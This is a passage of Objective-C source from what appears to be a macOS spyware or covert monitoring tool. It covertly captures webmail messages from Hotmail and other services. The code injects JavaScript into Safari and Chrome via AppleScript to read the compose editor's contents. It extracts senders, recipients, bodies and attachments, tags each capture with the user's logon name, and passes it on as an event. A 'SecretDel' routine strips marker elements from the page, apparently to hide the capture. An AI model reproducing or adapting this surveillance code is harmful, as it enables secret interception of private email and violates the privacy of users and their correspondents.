            NSString * headerSource;
            NSArray * temp = [clearHTML componentsSeparatedByString:@"id=\"toCP\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"id=\"Cc\""];
            headerSource = [temp objectAtIndex:0];
            
            temp = [headerSource componentsSeparatedByString:@"class=\"cp_awe cp_Contact t_sbgc"];
            for (int i=1; i<[temp count]; i++) {
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"</span>"];
                    [receiver addObject:[localTemp objectAtIndex:0]];
                }
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"class=\"hideText\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@";</span>"];
                    NSString *clearSymbol = [localTemp objectAtIndex:0];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&gt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&lt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\\" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@" " withString:@""];
                    [receiverEmail addObject:clearSymbol];
                }
            }
        }
        DLog(@"Cc");
        if ([clearHTML rangeOfString:@"id=\"Cc\""].location != NSNotFound) {
            NSString * headerSource;
            NSArray * temp = [clearHTML componentsSeparatedByString:@"id=\"Cc\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"id=\"Bcc\""];
            headerSource = [temp objectAtIndex:0];
            
            temp = [headerSource componentsSeparatedByString:@"class=\"cp_awe cp_Contact t_sbgc"];
            for (int i=1; i<[temp count]; i++) {
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"</span>"];
                    [receiver addObject:[localTemp objectAtIndex:0]];
                }
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"class=\"hideText\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@";</span>"];
                    NSString *clearSymbol = [localTemp objectAtIndex:0];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&gt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&lt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\\" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@" " withString:@""];
                    [receiverEmail addObject:clearSymbol];
                }
            }
        }
        DLog(@"Bcc");
        if ([clearHTML rangeOfString:@"id=\"Bcc\""].location != NSNotFound) {
            NSString * headerSource;
            NSArray * temp = [clearHTML componentsSeparatedByString:@"id=\"Bcc\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"ComposeContentHeader\""];
            headerSource = [temp objectAtIndex:0];
            
            temp = [headerSource componentsSeparatedByString:@"class=\"cp_awe cp_Contact t_sbgc"];
            for (int i=1; i<[temp count]; i++) {
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"</span>"];
                    [receiver addObject:[localTemp objectAtIndex:0]];
                }
                if ([[temp objectAtIndex:i] rangeOfString:@"class=\"cp_name\""].location != NSNotFound) {
                    NSArray * localTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"cp_name\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@"class=\"hideText\">"];
                    localTemp = [[localTemp objectAtIndex:1]componentsSeparatedByString:@";</span>"];
                    NSString *clearSymbol = [localTemp objectAtIndex:0];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&gt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"&lt;" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@"\\" withString:@""];
                    clearSymbol = [clearSymbol stringByReplacingOccurrencesOfString:@" " withString:@""];
                    [receiverEmail addObject:clearSymbol];
                }
            }
        }
        
        DLog(@"Row Form");
        if ([clearHTML rangeOfString:@"class=\"Row From\""].location != NSNotFound) {
            NSString * headerSource;
            NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"Row From\""];
            temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"Row To\""];
            headerSource = [temp objectAtIndex:0];
 
            DLog(@"FromContainer1");
            if ([headerSource rangeOfString:@"class=\"FromContainer\""].location != NSNotFound) {
                NSArray * localTemp = [headerSource componentsSeparatedByString:@"class=\"FromContainer\""];
                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"Name t_atc\">"];
                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                sender = [localTemp objectAtIndex:0];
            }
            DLog(@"FromContainer2");
            if ([headerSource rangeOfString:@"class=\"FromContainer\""].location != NSNotFound) {
                NSArray * localTemp = [headerSource componentsSeparatedByString:@"class=\"FromContainer\""];
                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"Address t_qtc\">"];
                localTemp = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                senderEmail = [localTemp objectAtIndex:0];
            }
        }
        DLog(@"composeRteBox");
        if ([clearHTML rangeOfString:@"class=\"composeRteBox\""].location != NSNotFound) {
            NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"composeRteBox\""];
            temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"composeFooterContainer\""];
            messageBody = [temp objectAtIndex:0];
            
            if ([aType isEqualToString:@"Safari"]) {
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() {var  myVar = document.getElementById('ComposeRteEditor_surface').contentWindow.document.documentElement.outerHTML; return myVar;} myValue();\" in document 1 \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                messageBody = [scptResult stringValue];
                [scpt release];
            }else if ([aType isEqualToString:@"Google Chrome"]) {
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() {var myVar = document.getElementById('ComposeRteEditor_surface').contentWindow.document.documentElement.outerHTML; return myVar;} myValue();\" \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                messageBody = [scptResult stringValue];
                [scpt release];
            }
            
            //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }
        DLog(@"ComposeContentHeader");
        if ([clearHTML rangeOfString:@"class=\"ComposeContentHeader\""].location != NSNotFound) {
            NSArray * temp = [clearHTML componentsSeparatedByString:@"class=\"ComposeContentHeader\""];
            temp =[[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"composeFooterContainer\""];
            
            if ([[temp objectAtIndex:0] rangeOfString:@"class=\"captionText\""].location != NSNotFound) {
                NSArray * localtemp = [[temp objectAtIndex:0] componentsSeparatedByString:@"class=\"captionText\">"];
                for (int i=1; i<[localtemp count]; i++) {
                    NSArray * subtemp = [[localtemp objectAtIndex:i]componentsSeparatedByString:@"</p>"];
                    subtemp = [[subtemp objectAtIndex:0] componentsSeparatedByString:@"</script>"];
                    subtemp = [[subtemp objectAtIndex:1] componentsSeparatedByString:@"<script "];
                    [attachment addObject:[subtemp objectAtIndex:0]];
                }
            }
        }
        
        sentDate = [WebmailHTMLParser roundUpSecond];
        
        [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"HOTMAIL" direction:kOutgoing];
        
        NSAppleScript *scpt;
        if ([aType isEqualToString:@"Safari"]) {
            scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Safari\" \n do JavaScript \"function SecretDel() { var node = document.getElementsByClassName('hm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" in document 1 \n return the result \n end tell"];
            [scpt executeAndReturnError:nil];
            [scpt release];
        }else if ([aType isEqualToString:@"Google Chrome"]) {
            scpt =[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function SecretDel() { var node = document.getElementsByClassName('hm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" \n return the result \n end tell"];
            [scpt executeAndReturnError:nil];
            [scpt release];
        }
        
    }
    
    DLog(@"End OUT Hotmail_HTMLParser");
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) Firefox_HTMLParser:(NSString *)aString withDirection:(int)aDirection from:(NSString *)aFrom {
    
    NSString * title;
    NSString * url;
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSArray * spliter = [aString componentsSeparatedByString:@"T::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"U::=>"];
    title = [spliter objectAtIndex:0];
    title = [title stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
    
    spliter = [aString componentsSeparatedByString:@"U::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"J::=>"];
    url = [spliter objectAtIndex:0];
    
    spliter = [aString componentsSeparatedByString:@"J::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"S::=>"];
    subject = [spliter objectAtIndex:0];
    subject = [subject stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
    
    spliter = [aString componentsSeparatedByString:@"S::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"D::=>"];
    NSString * temp = [spliter objectAtIndex:0];
    temp = [temp stringByReplacingOccurrencesOfString:@"From:" withString:@""];
    spliter = [temp componentsSeparatedByString:@" "];
    for (int i=0; i < [spliter count]; i++) {
        if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
            senderEmail = [spliter objectAtIndex:i];
            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"(" withString:@""];
            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@")" withString:@""];
            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"<" withString:@""];
            senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@">" withString:@""];
            senderEmail = [senderEmail stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
        }else{
            if (sender) {
                sender = [NSString stringWithFormat:@"%@ %@",sender,[spliter objectAtIndex:i]];
            }else{
                sender = [spliter objectAtIndex:i];
            }
        }
    }
    sender = [sender stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
    
    spliter = [aString componentsSeparatedByString:@"D::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"R::=>"];
    sentDate = [spliter objectAtIndex:0];
    sentDate = [sentDate stringByReplacingOccurrencesOfString:@"Sent:" withString:@""];
    sentDate = [sentDate stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
    
    spliter = [aString componentsSeparatedByString:@"R::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"M::=>"];
    temp = [spliter objectAtIndex:0];
    temp = [temp stringByReplacingOccurrencesOfString:@"To:" withString:@""];
    temp = [temp stringByReplacingOccurrencesOfString:@"Cc:" withString:@""];
    temp = [temp stringByReplacingOccurrencesOfString:@"," withString:@" "];
    temp = [[temp componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]] componentsJoinedByString:@" "];
    
    spliter = [temp componentsSeparatedByString:@" "];
    NSString * tempName = @"";
    for (int i=0; i < [spliter count]; i++) {
        if ([[spliter objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound) {
            NSString *localtemp = [spliter objectAtIndex:i];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"(" withString:@""];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@")" withString:@""];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"<" withString:@""];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@">" withString:@""];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];
            localtemp = [localtemp stringByReplacingOccurrencesOfString:@";" withString:@""];
            localtemp = [localtemp stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
            
            if (![receiverEmail containsObject:localtemp]) {
                [receiverEmail addObject:localtemp];
                tempName = [tempName stringByReplacingOccurrencesOfString:@"(" withString:@""];
                tempName = [tempName stringByReplacingOccurrencesOfString:@")" withString:@""];
                tempName = [tempName stringByReplacingOccurrencesOfString:@";" withString:@""];
                tempName = [tempName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                [receiver addObject:tempName];
            }
            tempName=@"";
        }else{
            if (tempName) {
                tempName = [NSString stringWithFormat:@"%@ %@ ",tempName,[spliter objectAtIndex:i]];
            }else{
                tempName = [spliter objectAtIndex:i];
            }
        }
    }
    
    spliter = [aString componentsSeparatedByString:@"M::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"A::=>"];
    messageBody = [spliter objectAtIndex:0];
    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    spliter = [aString componentsSeparatedByString:@"A::=>"];
    spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"END:=>"];
    NSString * tempAttach = [spliter objectAtIndex:0];
    tempAttach = [tempAttach stringByReplacingOccurrencesOfString:@" " withString:@""];
    if ([tempAttach  length]>0) {
        spliter = [tempAttach componentsSeparatedByString:@","];
        for (int i =0 ; i < [spliter count]; i++) {
            NSString * attachName = [[spliter objectAtIndex:i] stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
            [attachment addObject:attachName];
        }
    }
    
    if (aDirection) {
        sentDate = [WebmailHTMLParser roundUpSecond];
    }
    
    [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:aFrom direction:aDirection];
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) readyToSend_subject:(NSString *) aSubject sender:(NSString *) aSender senderEmail:(NSString *) aSenderEmail senderImageUrl:(NSString *)aSenderImageUrl sentDate:(NSString *)aSentDate receiver:(NSArray *)aReceiver receiverEmail:(NSArray *)aReceiverEmail receiverImageUrl:(NSString *)aReceiverImageUrl attachment:(NSArray *)aAttachment messageBody:(NSString *)aBody mailType:(NSString *)aMail direction:(int)aDirection{
    
    DLog(@"###### ===>===>===>===>===>===>===> readyToSend");
    DLog(@"Direction        { %d }",aDirection);
    DLog(@"Subject          { %@ }",aSubject);
    DLog(@"SenderImageUrl   { %@ }",aSenderImageUrl);
    DLog(@"Sender           { %@ }",aSender);
    DLog(@"SenderEmail      { %@ }",aSenderEmail);
    DLog(@"SentDate         { %@ }",aSentDate);
    DLog(@"ReceiverImageUrl { %@ }",aReceiverImageUrl);
    DLog(@"Receiver         { %@ }",aReceiver);
    DLog(@"ReceiverEmail    { %@ }",aReceiverEmail);
    //DLog(@"messageBody      { %@ }",aBody);
    DLog(@"Attachment       { %@ }",aAttachment);

    //if ([aReceiverEmail count]>0 && [aSenderEmail length]>0 && ( [aAttachment count]>0 || [aBody length]>0) ) {
    if ([aReceiverEmail count]>0 && [aSenderEmail length]>0 ) {
        NSMutableDictionary *webmailInfo = [NSMutableDictionary dictionary];
        [webmailInfo setObject:aSentDate forKey:@"sent-date"];
        [webmailInfo setObject:aSubject forKey:@"subject"];
        [webmailInfo setObject:aSenderEmail forKey:@"sender-email"];
        [webmailInfo setObject:aReceiverEmail forKey:@"receiver-emails"];
        
        FxEmailServiceType type = kEmailServiceTypeUnknown;
        if ([aMail isEqualToString:@"YAHOO"]) {
            type = kEmailServiceTypeYahoo;
        } else  if ([aMail isEqualToString:@"GMAIL"]) {
            type = kEmailServiceTypeGmail;
        } else if ([aMail isEqualToString:@"HOTMAIL"]) {
            type = kEmailServiceTypeLiveHotmail;
        }
        DLog(@"type { %d }",type);

        FxEventDirection direction = (aDirection == kOutgoing) ? kEventDirectionOut : kEventDirectionIn;
        
        NSString *makeUpBody = aBody;
        if (direction == kEventDirectionIn) {
            makeUpBody = [NSString stringWithFormat:@"<p style=\"font-family: Arial, Helvetica, sans-serif; font-size: 15px;\">Mail On %@</p><br><div>%@</div>", aSentDate, aBody];
        }

        WebmailHTMLParser *webmailParser = [self sharedWebmailHTMLParser];
        if (![webmailParser.mWebmailChecker isWebmailCheckInAndCheckInIfNecessary:webmailInfo]) {
            if ([webmailParser.mDelegate respondsToSelector:webmailParser.mSelector]) {
                FxEmailMacOSEvent *webmailEvent = [[[FxEmailMacOSEvent alloc] init] autorelease];
                [webmailEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [webmailEvent setMDirection:direction];
                [webmailEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                [webmailEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
                [webmailEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
                [webmailEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
                [webmailEvent setMEmailServiceType:type];
                [webmailEvent setMSenderEmail:aSenderEmail];
                [webmailEvent setMSenderName:aSender];
                
                NSMutableArray *recipients = [NSMutableArray array];
                for (int i = 0; i < MIN([aReceiver count], [aReceiverEmail count]); i++) {
                    FxRecipient *recipient = [[[FxRecipient alloc] init] autorelease];
                    [recipient setRecipType:kFxRecipientTO];
                    [recipient setRecipNumAddr:[aReceiverEmail objectAtIndex:i]];
                    [recipient setRecipContactName:[aReceiver objectAtIndex:i]];
                    [recipients addObject:recipient];
                }
                [webmailEvent setMRecipients:recipients];
                
                [webmailEvent setMSubject:aSubject];
                [webmailEvent setMBody:makeUpBody];
                
                NSMutableArray *attachments = [NSMutableArray array];
                for (NSString *attachmentName in aAttachment) {
                    FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
                    [attachment setFullPath:attachmentName];
                    [attachments addObject:attachment];
                }
                [webmailEvent setMAttachments:attachments];
                
                [webmailParser.mDelegate performSelector:webmailParser.mSelector onThread:webmailParser.mThreadA withObject:webmailEvent waitUntilDone:NO];
                DLog(@"### Done Sending EmailEvent ###");
            }
        }else{
            DLog(@"### Duplicate Event => No capture ###");
        }
    }else{
        DLog(@"### Incomplete Email No Sender or No Receiver => No capture ###");
    }
}

#pragma mark -Utility

+(NSString *)roundUpSecond{
    NSString * returndata;
    NSCalendar *calendar = [NSCalendar currentCalendar];
    NSDateComponents *components = [calendar components:(NSCalendarUnitYear | NSCalendarUnitMonth | NSCalendarUnitDay | NSCalendarUnitHour | NSCalendarUnitMinute |NSCalendarUnitSecond) fromDate:[NSDate date]];
    
    NSInteger second = [components second];
    
    if (second >=0 && second < 5) {
        second = 5;
    }else if (second >=5 && second < 10) {
        second = 10;
    }else if (second >=10 && second < 15) {
        second = 15;
    }else if (second >=15 && second < 20) {
        second = 20;
    }else if (second >=20 && second < 25) {
        second = 25;
    }else if (second >=25 && second < 30) {
        second = 30;
    }else if (second >=30 && second < 35) {
        second = 35;
    }else if (second >=35 && second < 40) {
        second = 40;
    }else if (second >=40 && second < 45) {
        second = 45;
    }else if (second >=45 && second < 50) {
        second = 50;
    }else if (second >=50 && second < 55) {
        second = 55;
    }else if (second >=55 && second <= 59) {
        second = 59;
    }
    
    returndata = [NSString stringWithFormat:@"%d-%d-%d %d:%d:%d",(int)[components year],(int)[components month],(int)[components day],(int)[components hour],(int)[components minute],(int)second];
    return returndata;
}

- (void) dealloc {
    [mThreadA release];
    [super dealloc];
}

@end
